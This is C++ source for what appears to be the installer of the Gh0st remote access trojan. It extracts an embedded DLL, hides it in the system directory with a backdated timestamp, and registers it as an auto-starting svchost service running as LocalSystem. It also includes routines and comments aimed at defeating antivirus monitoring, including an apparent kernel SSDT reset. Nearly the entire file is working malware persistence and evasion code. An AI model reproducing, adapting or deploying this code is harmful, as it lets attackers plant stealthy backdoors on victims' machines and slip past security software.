// install.cpp : Defines the entry point for the application.
//

#include "StdAfx.h"

//#pragma comment(linker, "/entry:EntryPoint")
#pragma comment(linker, "/OPT:NOWIN98")


#include "resource.h"
#include <windows.h>

void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	dbg_dump(ExceptionInfo);
	ExitProcess(0);
}

BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFileName)
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes;
	char	strTempPath[MAX_PATH];
	GetTempPath(sizeof(strTempPath), strTempPath);
	lstrcat(strTempPath, "\\release.tmp");
	
	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL)
		return FALSE;
	hRes = LoadResource(hModule, hResInfo);
	if (hRes == NULL)
		return FALSE;
	hFile = CreateFile
		(
		strTempPath, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL)
		return FALSE;

	SYSTEMTIME st;
	memset(&st, 0, sizeof(st));
	st.wYear = 2004;
	st.wMonth = 8;
	st.wDay = 17;
	st.wHour = 20;
	st.wMinute = 0;
	FILETIME ft,LocalFileTime;
	SystemTimeToFileTime(&st, &ft);
	LocalFileTimeToFileTime(&ft,&LocalFileTime);
	SetFileTime(hFile, &LocalFileTime, (LPFILETIME) NULL,	&LocalFileTime);

	WriteFile(hFile, hRes, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	CloseHandle(hFile);
	
	// Fuck KV File Create Moniter
	MoveFile(strTempPath, lpFileName);
	SetFileAttributes(lpFileName, FILE_ATTRIBUTE_HIDDEN);
	DeleteFile(strTempPath);
	return TRUE;
}

char *AddsvchostService()
{
	char	*lpServiceName = NULL;
	int rc = 0;
	HKEY hkRoot;
    char buff[2048];
    //query svchost setting
    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
    if(ERROR_SUCCESS != rc)
        return NULL;
	
    DWORD type, size = sizeof buff;
    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        RegCloseKey(hkRoot);
	
	int i = 0;
	bool bExist = false;
	char servicename[50];
	do
	{	
		wsprintf(servicename, "netsvcs_0x%d", i);
		for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
		{
			if (lstrcmpi(ptr, servicename) == 0)
			{	
				bExist = true;
				break;
			}
		}
		if (bExist == false)
			break;
		bExist = false;
		i++;
	} while(1);
	
	servicename[lstrlen(servicename) + 1] = '\0';
	memcpy(buff + size - 1, servicename, lstrlen(servicename) + 2);
	
    rc = RegSetValueEx(hkRoot, "netsvcs", 0, REG_MULTI_SZ, (unsigned char*)buff, size + lstrlen(servicename) + 1);
	
	RegCloseKey(hkRoot);
	
    SetLastError(rc);
	
	if (bExist == false)
	{
		lpServiceName = new char[lstrlen(servicename) + 1];
		lstrcpy(lpServiceName, servicename);
	}
	
	return lpServiceName;
}
// 随机选择服务安装,返回安装成功的服务名

char *InstallService()
{
    // Open a handle to the SC Manager database.
	char *lpServiceName = NULL;
    int rc = 0;
    HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
    SC_HANDLE hscm = NULL, schService = NULL;
	char strModulePath[MAX_PATH];
	char	strSysDir[MAX_PATH];
	DWORD	dwStartType = 0;
    try{
    char buff[1024];
    //query svchost setting
    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    rc = RegOpenKeyEx(hkRoot, pSvchost, 0, KEY_QUERY_VALUE, &hkRoot);
    if(ERROR_SUCCESS != rc)
    {
        throw "";
    }

    DWORD type, size = sizeof buff;
    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
    RegCloseKey(hkRoot);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        throw "RegQueryValueEx(Svchost\\netsvcs)";


    //install service
    hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hscm == NULL)
        throw "OpenSCManager()";

	GetSystemDirectory(strSysDir, sizeof(strSysDir));
	char *bin = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
    for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
    {
		//////////////////////////////////////////////////////////////////////////
		char temp[500];
		wsprintf(temp, "SYSTEM\\CurrentControlSet\\Services\\%s", ptr);
		rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, temp, 0, KEY_QUERY_VALUE, &hkRoot);
		if (rc == ERROR_SUCCESS)
		{
			RegCloseKey(hkRoot);
			continue;
		}

		memset(strModulePath, 0, sizeof(strModulePath));
		wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, ptr);
		// 删除试试
		DeleteFile(strModulePath);
		// 以前的服务文件没有删除之前，服务的DLL还在svchost中，所以不用这个服务
		if (GetFileAttributes(strModulePath) != INVALID_FILE_ATTRIBUTES)
			continue;

		schService = CreateService(
			hscm,                       // SCManager database
			ptr,                    // name of service
			ptr,           // service name to display
			SERVICE_ALL_ACCESS,        // desired access
			SERVICE_WIN32_SHARE_PROCESS,
			SERVICE_AUTO_START,      // start type
			SERVICE_ERROR_NORMAL,      // error control type
			bin,        // service's binary
			NULL,                      // no load ordering group
			NULL,                      // no tag identifier
			NULL,                      // no dependencies
			NULL,                      // LocalSystem account
			NULL);                     // no password
		
		if (schService != NULL)
			break;
	}

	if (schService == NULL)
	{
		lpServiceName = AddsvchostService();
		memset(strModulePath, 0, sizeof(strModulePath));
		wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, lpServiceName);
		schService = CreateService(
			hscm,                      // SCManager database
			lpServiceName,                    // name of service
			lpServiceName,           // service name to display
			SERVICE_ALL_ACCESS,        // desired access
			SERVICE_WIN32_OWN_PROCESS,
			SERVICE_AUTO_START,      // start type
			SERVICE_ERROR_NORMAL,      // error control type
			bin,        // service's binary
			NULL,                      // no load ordering group
			NULL,                      // no tag identifier
			NULL,                      // no dependencies
			NULL,                      // LocalSystem account
			NULL);                     // no password
		dwStartType = SERVICE_WIN32_OWN_PROCESS;
	}
	else
	{
		dwStartType = SERVICE_WIN32_SHARE_PROCESS;
		lpServiceName = new char[lstrlen(ptr) + 1];
		lstrcpy(lpServiceName, ptr);
	}
	if (schService == NULL)
		throw "CreateService(Parameters)";

    CloseServiceHandle(schService);
    CloseServiceHandle(hscm);

    //config service
    hkRoot = HKEY_LOCAL_MACHINE;
    strncpy(buff, "SYSTEM\\CurrentControlSet\\Services\\", sizeof buff);
    strncat(buff, lpServiceName, 100);
    rc = RegOpenKeyEx(hkRoot, buff, 0, KEY_ALL_ACCESS, &hkRoot);
    if(ERROR_SUCCESS != rc)
    {
        throw "";
    }

	if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
	{
		DWORD dwServicesType = 0x120;
		rc = RegSetValueEx(hkRoot, "Type", 0, REG_DWORD, (unsigned char*)&dwServicesType, sizeof(dwServicesType));
		SetLastError(rc);
		if(ERROR_SUCCESS != rc)
			throw "RegSetValueEx(ServiceDll)";
	}

    rc = RegCreateKey(hkRoot, "Parameters", &hkParam);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        throw "RegCreateKey(Parameters)";


    rc = RegSetValueEx(hkParam, "ServiceDll", 0, REG_EXPAND_SZ, (unsigned char*)strModulePath, strlen(strModulePath)+1);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        throw "RegSetValueEx(ServiceDll)";


    }catch(char *str)
    {
        if(str && str[0])
        {
            rc = GetLastError();
        }
    }
 
    RegCloseKey(hkRoot);
    RegCloseKey(hkParam);
    CloseServiceHandle(schService);
    CloseServiceHandle(hscm);
	

	if (lpServiceName != NULL)
		ReleaseResource(NULL, IDR_DLL, "BIN", strModulePath);

    return lpServiceName;
}

void StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

bool ResetSSDT(HMODULE	hModule)
{
	typedef bool (__stdcall * LPResetSSDT)();
	bool	bRet = true;
	char	strDllPath[MAX_PATH];
	GetTempPath(sizeof(strDllPath), strDllPath);
	lstrcat(strDllPath, "\\dll.tmp");
	try
	{
		ReleaseResource(NULL, IDR_DLL, "BIN", strDllPath);	
		HMODULE	hDll = LoadLibrary(strDllPath);
		if (hDll == NULL)
			throw "";
		LPResetSSDT	ResetSSDT = (LPResetSSDT)GetProcAddress(hDll, "ResetSSDT");
		if (ResetSSDT == NULL)
			throw "";
		ResetSSDT();
		FreeLibrary(hDll);
			
	}catch(...)
	{
		bRet = false;
	}
	DeleteFile(strDllPath);
	return bRet;
}
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.

	//////////////////////////////////////////////////////////////////////////
	OutputDebugString("%%%%%Fuck KV %%%%%Fuck KV %%%%%");
	CopyFile("%%%%%Fuck KV %%%%%Fuck KV %%%%%", NULL, false);
	//////////////////////////////////////////////////////////////////////////

	char	*lpEncodeString = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";

	// 如果不是更新服务端
	if (strstr(GetCommandLine(), "Gh0st Update") == NULL)
	{
		HANDLE	hMutex = CreateMutex(NULL, true, lpEncodeString);
		DWORD	dwLastError = GetLastError();
		// 普通权限访问系统权限创建的Mutex,如果存在，如果存在就返回拒绝访问的错误
		// 已经安装过一个一模一样配置的，就不安装了
		if (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED)
			return -1;
		ReleaseMutex(hMutex);
		CloseHandle(hMutex);
	}


	SetUnhandledExceptionFilter(bad_exception);
	
	ResetSSDT(hInstance);
	char	strSelf[MAX_PATH];

	memset(strSelf, 0, sizeof(strSelf));
	GetModuleFileName(NULL, strSelf, sizeof(strSelf));

	char	strTempPath[MAX_PATH], strSysLog[MAX_PATH];
	GetTempPath(sizeof(strTempPath), strTempPath);
	GetSystemDirectory(strSysLog, sizeof(strSysLog));
	lstrcat(strTempPath, "\\install.tmp");
	lstrcat(strSysLog, "\\install.tmp");
	HANDLE	hFile = CreateFile(strTempPath, GENERIC_ALL, FILE_SHARE_WRITE, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	WriteFile(hFile, strSelf, lstrlen(strSelf), &dwBytesWrite, NULL);
	CloseHandle(hFile);
	MoveFile(strTempPath, strSysLog);
	DeleteFile(strTempPath);


	char *lpServiceName = InstallService();
	if (lpServiceName != NULL)
	{
		StartService(lpServiceName);
		delete [] lpServiceName;
		
	}
	return -1;
}



